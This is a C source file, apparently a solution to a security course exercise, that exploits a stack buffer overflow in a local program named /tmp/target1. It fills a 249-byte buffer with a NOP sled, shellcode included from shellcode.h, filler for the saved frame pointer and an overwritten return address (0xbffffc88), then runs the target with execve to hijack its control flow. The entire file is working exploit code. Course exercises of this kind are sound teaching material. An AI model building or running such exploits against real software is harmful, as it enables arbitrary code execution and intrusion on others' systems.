#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  
  // buf to target foo function in target1
  char buf[249];
  // adress of the local variable buf in foo function
  int addr;
  addr = 0xbffffc88;
  
  int i;
  for(i = 0; i < 248; i++) {
    if(i < (240 - strlen(shellcode))) {
      *(buf + i) = '\x90'; // add nop
    } else if(i < 240) {
      *(buf + i) = shellcode[i - 240 + strlen(shellcode)]; // add shellcode
    } else if(i < 244) {
      *(buf + i) = '\x90'; // sfp
    } else if(i < 248) {
      *(buf + i) = addr >> ((i - 244)*8); // make fake ret
    }
  }
  *(buf + 248) = '\x00'; // add null

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
